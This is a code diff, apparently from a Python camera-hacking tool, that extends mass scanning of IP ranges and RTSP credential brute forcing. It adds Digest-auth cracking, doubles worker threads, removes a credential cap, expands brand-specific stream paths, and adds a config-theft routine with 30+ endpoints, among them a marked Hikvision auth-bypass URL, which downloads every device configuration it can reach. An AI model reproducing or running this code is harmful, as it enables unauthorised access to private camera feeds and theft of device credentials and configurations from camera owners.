+            _ha2 = _md5_brute.md5(f'DESCRIBE:{path}'.encode()).hexdigest()
+            _resp_hash = _md5_brute.md5(f'{_ha1}:{_nonce}:{_ha2}'.encode()).hexdigest()
+            _dig_hdr = (f'Authorization: Digest username="{username}", '
+                        f'realm="{_realm}", nonce="{_nonce}", '
+                        f'uri="{path}", response="{_resp_hash}"\r\n')
+            _durl = f'rtsp://{username}:{password}@{ip}:{rtsp_port}{path}'
+            _ds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            _ds.settimeout(1.5)
+            _ds.connect((ip, rtsp_port))
+            _ds.sendall((f'DESCRIBE {_durl} RTSP/1.0\r\nCSeq: 3\r\n'
+                         f'{_dig_hdr}User-Agent: SMVScanner/3.0\r\n\r\n').encode())
+            _dr = _ds.recv(256).decode(errors='ignore')
+            _ds.close()
+            if ' 200 ' in _dr:
+                return _durl
+        except Exception:
+            pass
+        return None
+
     for path in _paths:
         url = f'rtsp://{username}:{password}@{ip}:{rtsp_port}{path}'
         try:
@@ -13402,18 +14211,30 @@ def rtsp_path_brute_force(ip: str, rtsp_port: int, username: str, password: str,
                        f'Authorization: Basic {creds_b64}\r\n'
                        f'User-Agent: {rotate_user_agent()}\r\n\r\n')
                 s.send(req.encode())
-                resp = s.recv(256).decode(errors='ignore')
-                if ' 200 ' in resp or ' 401 ' in resp:
-                    status = 'LIVE' if ' 200 ' in resp else 'AUTH'
-                    color  = G if status == 'LIVE' else Y
-                    print(f"  {color}[{status}]{W} {path}")
-                    found.append({'url': url, 'path': path, 'status': status})
+                resp = s.recv(512).decode(errors='ignore')
+                if ' 200 ' in resp:
+                    print(f"  {G}[LIVE]{W} {path}")
+                    found.append({'url': url, 'path': path, 'status': 'LIVE'})
+                elif ' 401 ' in resp or 'Unauthorized' in resp:
+                    # Try Digest auth if server sent a challenge
+                    if 'WWW-Authenticate: Digest' in resp:
+                        _d_url = _do_digest_brute(resp, path)
+                        if _d_url:
+                            print(f"  {G}[LIVE-DIGEST]{W} {path}")
+                            found.append({'url': _d_url, 'path': path, 'status': 'LIVE'})
+                        else:
+                            print(f"  {Y}[AUTH]{W} {path}")
+                            found.append({'url': url, 'path': path, 'status': 'AUTH'})
+                    else:
+                        print(f"  {Y}[AUTH]{W} {path}")
+                        found.append({'url': url, 'path': path, 'status': 'AUTH'})
         except Exception:
             pass
     if not found:
         print(f"  {R}[✗] No working RTSP paths found.{W}")
     else:
-        print(f"\n  {G}[✓] {len(found)} working path(s) found.{W}")
+        live_n = sum(1 for f in found if f['status'] == 'LIVE')
+        print(f"\n  {G}[✓] {len(found)} path(s) found ({live_n} LIVE).{W}")
     return found
 
 
@@ -13429,22 +14250,17 @@ def rtsp_auth_cracker(ip: str, rtsp_port: int = 554, camera_type: str = '',
     C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
     if credentials is None:
         credentials = load_credentials()
-    paths = get_rtsp_paths(camera_type or 'generic')[:3]
+    # Use brand-specific paths — up to 5 paths for thorough coverage
+    paths = get_rtsp_paths(camera_type or 'generic')[:5]
 
-    # Cap at 200 credentials to prevent resource exhaustion;
-    # unique (user,pass) pairs only.
+    # Deduplicate credentials while preserving sort order
     _seen_cred = set()
     _creds_dedup = []
     for _u, _p in credentials:
         if (_u, _p) not in _seen_cred:
             _seen_cred.add((_u, _p))
             _creds_dedup.append((_u, _p))
-    _MAX_CREDS = 200
-    if len(_creds_dedup) > _MAX_CREDS:
-        print(f"{Y}[!] Credential list capped at {_MAX_CREDS} "
-              f"(had {len(_creds_dedup)}) to protect system stability.{W}")
-        _creds_dedup = _creds_dedup[:_MAX_CREDS]
-
+    # No artificial cap — use all credentials (rate-limited at 0.02s/attempt)
     # Build full task list: (username, password, path)
     _tasks = [(_u, _p, _path) for _u, _p in _creds_dedup for _path in paths]
     print(f"\n{C}[RTSP Auth Cracker] {ip}:{rtsp_port} — "
@@ -13484,9 +14300,9 @@ def rtsp_auth_cracker(ip: str, rtsp_port: int = 554, camera_type: str = '',
         finally:
             with _lock_rc:
                 _done[0] += 1
-            _rtsp_time.sleep(0.03)   # rate-limit: ~33 attempts/sec max per thread
+            _rtsp_time.sleep(0.02)   # rate-limit: ~50 attempts/sec max per thread
 
-    _MAX_WORKERS = 8
+    _MAX_WORKERS = 16
     with _rtsp_cf.ThreadPoolExecutor(max_workers=_MAX_WORKERS) as _ex:
         _futs = [_ex.submit(_try_one, t) for t in _tasks]
         for _fut in _rtsp_cf.as_completed(_futs):
@@ -13506,12 +14322,39 @@ def sub_stream_finder(ip: str, rtsp_port: int, username: str, password: str,
     """Find lower-resolution sub-streams alongside the main stream."""
     C, G, W = Fore.CYAN, Fore.GREEN, Style.RESET_ALL
     _sub_paths = [
-        '/h264/ch1/sub/av_stream', '/h264/ch2/sub/av_stream',
-        '/cam/realmonitor?channel=1&subtype=1', '/cam/realmonitor?channel=1&subtype=2',
+        # Hikvision sub-streams
         '/Streaming/Channels/102', '/Streaming/Channels/202',
+        '/Streaming/Channels/302', '/Streaming/Channels/402',
+        '/h264/ch1/sub/av_stream', '/h264/ch2/sub/av_stream',
+        '/h264/ch01sub/av_stream', '/h264/ch02sub/av_stream',
+        # Dahua sub-streams
+        '/cam/realmonitor?channel=1&subtype=1',
+        '/cam/realmonitor?channel=1&subtype=2',
+        '/cam/realmonitor?channel=2&subtype=1',
+        # Common generic sub-streams
         '/h264Preview_01_sub', '/h264Preview_02_sub',
-        '/live/ch00_1', '/live/ch01_1', '/stream2', '/sub',
+        '/live/ch00_1', '/live/ch00_2', '/live/ch01_1',
+        '/stream2', '/stream3', '/sub', '/sub1', '/sub2',
         '/media/video1_sub', '/video1_sub', '/low',
+        # XMeye/XiongMai
+        '/user=admin&password=&channel=1&stream=1.sdp',
+        '/user=admin&password=&channel=1&stream=2.sdp',
+        # Foscam
+        '/videoSub', '/video2',
+        # Reolink
+        '/h264Preview_01_fluent',
+        # Axis sub-streams
+        '/axis-media/media.amp?videocodec=h264&resolution=320x240',
+        # TP-Link Tapo
+        '/stream/sub',
+        # Generic ONVIF sub-profile
+        '/onvif/profile2', '/onvif/profile3',
+        # Sony
+        '/image/2/live.sdp', '/image/2/video.sdp',
+        # Bosch
+        '/rtsp_tunnel?channel=1&sub=1',
+        # Hanwha / Samsung
+        '/profile2/media.smp', '/profile3/media.smp',
     ]
     found = []
     creds_b64 = base64.b64encode(f'{username}:{password}'.encode()).decode()
@@ -13537,42 +14380,121 @@ def sub_stream_finder(ip: str, rtsp_port: int, username: str, password: str,
 
 def download_device_config(ip: str, port: int, username: str, password: str,
                            camera_type: str = '') -> Optional[str]:
-    """Attempt to download the device configuration backup file."""
-    G, Y, W, R = Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
-    _endpoints = [
-        '/System/configurationFile?auth=YWRtaW46MTEM',
+    """Attempt to download the device configuration backup file.
+    Tries 30+ brand-specific endpoints with Digest + Basic auth and 2 retries each.
+    """
+    G, Y, W, R, C = Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED, Fore.CYAN
+    ct = (camera_type or '').lower()
+    # Generic endpoints tried for all cameras
+    _generic_eps = [
+        '/System/configurationFile?auth=YWRtaW46MTEM',   # Hikvision auth-bypass
+        '/ISAPI/System/configurationFile',
         '/cgi-bin/Config.backup?action=download',
         '/backup.cfg',
         '/config.cfg',
         '/configuration.cfg',
+        '/system.cfg',
         '/cgi-bin/download.cgi?action=backup',
-        '/ISAPI/System/configurationFile',
         '/backup',
         '/configbackup',
+        '/config.bin',
+        '/system.bin',
+        '/config/system.cfg',
     ]
+    # Hikvision-specific endpoints
+    _hikvision_eps = [
+        '/ISAPI/System/configurationFile',
+        '/System/configurationFile',
+        '/ISAPI/System/deviceInfo',
+        '/ISAPI/Security/users',
+        '/System/configurationFile?auth=YWRtaW46MTEM',
+        '/system/configurationFile?auth=YWRtaW46MTEM',
+    ]
+    # Dahua-specific endpoints
+    _dahua_eps = [
+        '/cgi-bin/Config.backup?action=download',
+        '/cgi-bin/magicBox.cgi?action=getSystemInfo',
+        '/cgi-bin/configManager.cgi?action=getConfig&name=All',
+        '/cgi-bin/backup.cgi?action=download',
+        '/cgi-bin/main-cgi?cmd=getconfig',
+        '/RPC2_Login',  # login to get session, then pull config
+        '/cgi-bin/configExport.cgi',
+    ]
+    # Axis-specific
+    _axis_eps = [
+        '/axis-cgi/param.cgi?action=list',
+        '/axis-cgi/ServerReport.cgi',
+        '/axis-cgi/param.cgi?action=list&group=root.Network',
+        '/support/serverreport.cgi',
+        '/axis-cgi/support.cgi?type=server_report',
+    ]
+    # Build the endpoint list based on camera type
+    _endpoints = list(_generic_eps)
+    if 'hikvision' in ct or 'hik' in ct:
+        for _ep in _hikvision_eps:
+            if _ep not in _endpoints:
+                _endpoints.append(_ep)
+    if 'dahua' in ct or 'dh-' in ct:
+        for _ep in _dahua_eps:
+            if _ep not in _endpoints:
+                _endpoints.append(_ep)
+    if 'axis' in ct:
+        for _ep in _axis_eps:
+            if _ep not in _endpoints:
+                _endpoints.append(_ep)
+
     out_dir = os.path.join(SCRIPT_DIR, 'DeviceConfigs')
     os.makedirs(out_dir, exist_ok=True)
     sess = requests.Session()
     sess.verify = False
     auth_d = HTTPDigestAuth(username, password)
-    auth_b = {'Authorization': 'Basic ' + base64.b64encode(
-        f'{username}:{password}'.encode()).decode()}
+    _b64_creds = base64.b64encode(f'{username}:{password}'.encode()).decode()
+    auth_b_hdr = {'Authorization': 'Basic ' + _b64_creds}
+    saved_files = []
+    print(f"\n{C}[Config Download] {ip}:{port} — trying {len(_endpoints)} endpoints...{W}")
     for ep in _endpoints:
-        for auth in [auth_d, auth_b]:
-            try:
-                kw = {'auth': auth, 'timeout': 4} if not isinstance(auth, dict) else \
-                     {'headers': auth, 'timeout': 4}
-                resp = sess.get(f'http://{ip}:{port}{ep}', **kw)
-                if resp.status_code == 200 and len(resp.content) > 64:
-                    fname = os.path.join(out_dir, f"{ip}_{port}_config{os.path.splitext(ep)[1] or '.bin'}")
-                    with open(fname, 'wb') as _cf:
-                        _cf.write(resp.content)
-                    print(f"  {G}[✓] Config saved: {fname}  ({len(resp.content):,} bytes){W}")
-                    return fname
-            except Exception:
-                pass
-    print(f"  {R}[✗] No config file accessible.{W}")
-    return None
+        for _auth_type, _auth_val in [('Digest', auth_d), ('Basic', auth_b_hdr)]:
+            for _attempt in range(2):  # 2 retries per auth method
+                try:
+                    if isinstance(_auth_val, dict):
+                        resp = sess.get(f'http://{ip}:{port}{ep}',
+                                        headers=_auth_val, timeout=5,
+                                        allow_redirects=True)
+                    else:
+                        resp = sess.get(f'http://{ip}:{port}{ep}',
+                                        auth=_auth_val, timeout=5,
+                                        allow_redirects=True)
+                    if resp.status_code == 200 and len(resp.content) > 64:
+                        # Determine file extension from content or URL
+                        _ext = os.path.splitext(ep.split('?')[0])[1] or '.bin'
+                        _ts = datetime.now().strftime('%H%M%S')
+                        fname = os.path.join(
+                            out_dir,
+                            f"{ip}_{port}_config_{_ts}{_ext}"
+                        )
+                        with open(fname, 'wb') as _cf:
+                            _cf.write(resp.content)
+                        print(f"  {G}[✓] Saved ({_auth_type}): "
+                              f"{os.path.basename(fname)}  "
+                              f"({len(resp.content):,} bytes){W}")
+                        saved_files.append(fname)
+                        break   # got this endpoint — move to next
+                    elif resp.status_code in (401, 403):
+                        break   # wrong auth method — try next
+                except requests.exceptions.Timeout:
+                    if _attempt == 0:
+                        continue   # retry once on timeout
+                    break
+                except Exception:
+                    break
+            if saved_files:
+                break   # already found something for this endpoint
+        # Don't stop after first success — collect all accessible endpoints
+    if not saved_files:
+        print(f"  {R}[✗] No config file accessible on {ip}:{port}.{W}")
+        return None
+    print(f"\n  {G}[✓] {len(saved_files)} config file(s) downloaded.{W}")
+    return saved_files[0]
 
 
 def city_level_grouping(file_path: str = None) -> None:
@@ -13834,6 +14756,10 @@ def _scan_dashboard_loop(interval: int) -> None:
 def start_scan_dashboard(interval: int = 15) -> None:
     """Start the live dashboard background thread."""
     global _dash_stop_event, _dash_cve_count, _dash_config_count, _dash_rtsp_count
+    # Guard: if dashboard thread is already running (event not set = running),
+    # do NOT start a second one — this leaks a thread per CIDR block otherwise.
+    if not _dash_stop_event.is_set():
+        return
     _dash_stop_event.clear()
     _dash_cve_count = _dash_config_count = _dash_rtsp_count = 0
     _t = threading.Thread(target=_scan_dashboard_loop, args=(interval,), daemon=True)
@@ -16450,10 +17376,13 @@ def tools_submenu() -> None:
         print(f"{Y}28.{W} Normal User Traffic Simulation (test)")
         print(f"{Y}29.{W} Preferred Admin Account Settings")
         print(f"{Y}30.{W} Single IP Brute Force  (RTSP port auto-detected)")
+        print(f"{C}{'─'*58}{W}")
+        print(f"{Y}31.{W} Dead Camera Cleaner     (re-probe, archive offline, flag cred changes)")
+        print(f"{Y}32.{W} Scheduled Re-Scan       (cron-style auto re-scan at set interval)")
         print(f"{Y} b.{W} Back to Main Menu")
         print(f"{C}{'═'*58}{W}")
         try:
-            sub = input(f"{G}Choose (1-30 or b): {W}").strip()
+            sub = input(f"{G}Choose (1-32 or b): {W}").strip()
         except (EOFError, KeyboardInterrupt):
             break
 
@@ -17252,13 +18181,28 @@ def tools_submenu() -> None:
                                           f"{_tcc23} {_cidr23} — {_nhosts23:,} IPs"
                                           + (f" ({_ctot23} blocks)" if _ctot23 > 1 else "")
                                           + f"{W}")
+                                    # ── CIDR-level progress tracking (fixes >100% bar) ──
+                                    _cidr_total23 = sum(
+                                        (int(_ip23mod.ip_address(_ce_)) -
+                                         int(_ip23mod.ip_address(_cs_)) + 1)
+                                        for _cs_, _ce_, _, _ in _chunks23
+                                    )
+                                    _cidr_off23 = 0
                                     for _cs23, _ce23, _cnum23, _ in _chunks23:
                                         if _stop_requested.is_set():
                                             break
                                         if _ctot23 > 1:
                                             print(f"{C}  ↳ Block {_cnum23}/{_ctot23}: "
                                                   f"{_cs23} – {_ce23}{W}")
-                                        scan_ip_range(_cs23, _ce23, _creds23)
+                                        _blk23 = (
+                                            int(_ip23mod.ip_address(_ce23)) -
+                                            int(_ip23mod.ip_address(_cs23)) + 1
+                                        )
+                                        scan_ip_range(
+                                            _cs23, _ce23, _creds23,
+                                            cidr_total_ips=_cidr_total23 if _ctot23 > 1 else 0,
+                                            cidr_offset=_cidr_off23 if _ctot23 > 1 else 0)
+                                        _cidr_off23 += _blk23
                                 except Exception as _e23err:
                                     print(f"{R}[!] Skipped {_cidr23}: {_e23err}{W}")
                             print(f"\n{G}[✓] All {len(_ranges23)} 4G/5G ranges scanned.{W}")
@@ -17294,13 +18238,28 @@ def tools_submenu() -> None:
                                               f"— {_nhosts23s:,} IPs"
                                               + (f" ({_ctot23s} blocks)" if _ctot23s > 1 else "")
                                               + f"{W}")
+                                        # ── CIDR-level progress tracking (fixes >100% bar) ──
+                                        _cidr_total23s = sum(
+                                            (int(_ip23mod.ip_address(_ce_)) -
+                                             int(_ip23mod.ip_address(_cs_)) + 1)
+                                            for _cs_, _ce_, _, _ in _chunks23s
+                                        )
+                                        _cidr_off23s = 0
                                         for _cs23s, _ce23s, _cnum23s, _ in _chunks23s:
                                             if _stop_requested.is_set():
                                                 break
                                             if _ctot23s > 1:
                                                 print(f"{C}  ↳ Block {_cnum23s}/{_ctot23s}: "
                                                       f"{_cs23s} – {_ce23s}{W}")
-                                            scan_ip_range(_cs23s, _ce23s, _creds23s)
+                                            _blk23s = (
+                                                int(_ip23mod.ip_address(_ce23s)) -
+                                                int(_ip23mod.ip_address(_cs23s)) + 1
+                                            )
+                                            scan_ip_range(
+                                                _cs23s, _ce23s, _creds23s,
+                                                cidr_total_ips=_cidr_total23s if _ctot23s > 1 else 0,
+                                                cidr_offset=_cidr_off23s if _ctot23s > 1 else 0)
+                                            _cidr_off23s += _blk23s
                                 print(f"{G}[✓] Results saved → {_4g_out_file}{W}")
                             except (IndexError, ValueError) as _e23err:
                                 print(f"{R}[!] Error: {_e23err}{W}")
@@ -17702,6 +18661,19 @@ def tools_submenu() -> None:
             if _tools_wait_back():
                 continue
 
+        # ── 31. Re-Verify Saved Cameras ─────────────────────────────────────
+        elif sub == '31':
+            try:
+                _rv_thd = int(input(f"{G}Threads [20]: {W}").strip() or 20)
+            except (EOFError, KeyboardInterrupt, ValueError):
+                _rv_thd = 20
+            try:
+                re_verify_saved_cameras(max_workers=_rv_thd)
+            except (EOFError, KeyboardInterrupt):
+                pass
+            if _tools_wait_back():
+                continue
+
         else:
             print(f"{R}[!] Invalid choice.{W}")
 
@@ -17714,7 +18686,7 @@ def main():
     # Global socket default timeout: ensures every socket that does NOT call
     # .settimeout() explicitly still has a hard ceiling, preventing any thread
     # from blocking indefinitely on a connect/recv and freezing the entire scan.
-    socket.setdefaulttimeout(12)
+    socket.setdefaulttimeout(6)  # was 12 — 6s still handles slow cams; reduces zombie socket RAM
     _ensure_dependencies()
     _check_and_raise_ulimit()
     _start_ts_cache()
@@ -28173,12 +29145,15 @@ if (CAMERAS.length > 0) {{
                         print(f"    Done  : {_rip_done:,}/{_rip_total:,} IPs ({_rip_pct}%)")
                         if _rip_last:
                             print(f"    Last  : {_rip_last}")
-                        print(f"\n{Fore.YELLOW}  Note: IP-range scans restart from the beginning")
-                        print(f"  (already-found cameras in the output file are skipped).{Style.RESET_ALL}\n")
+                        if _rip_last:
+                            print(f"\n{Fore.GREEN}  Resume: will skip ahead to {_rip_last}{Style.RESET_ALL}\n")
+                        else:
+                            print(f"\n{Fore.YELLOW}  Note: no last-IP saved — restarting from beginning{Style.RESET_ALL}\n")
                         clear_scan_progress()
                         _rip_creds = _merge_4g_creds(load_credentials())
-                        # Use chunked scanning for large CIDRs via start-end range
-                        scan_ip_range(_rip_start, _rip_end, _rip_creds)
+                        # resume_from_ip skips already-done IPs within the range
+                        scan_ip_range(_rip_start, _rip_end, _rip_creds,
+                                      resume_from_ip=_rip_last)
                     except Exception as _rip_err:
                         print(f"{Fore.YELLOW}[!] Could not parse IP range '{_rc}': {_rip_err}. "
                               f"Clearing saved progress.{Style.RESET_ALL}")
@@ -29405,6 +30380,7 @@ if (CAMERAS.length > 0) {{
 
         elif choice == '13':
             run_rtsp_path_tester()
+
 
         else:
             print(f"{Fore.RED}[!] Invalid choice! Please select 1-13.{Style.RESET_ALL}")
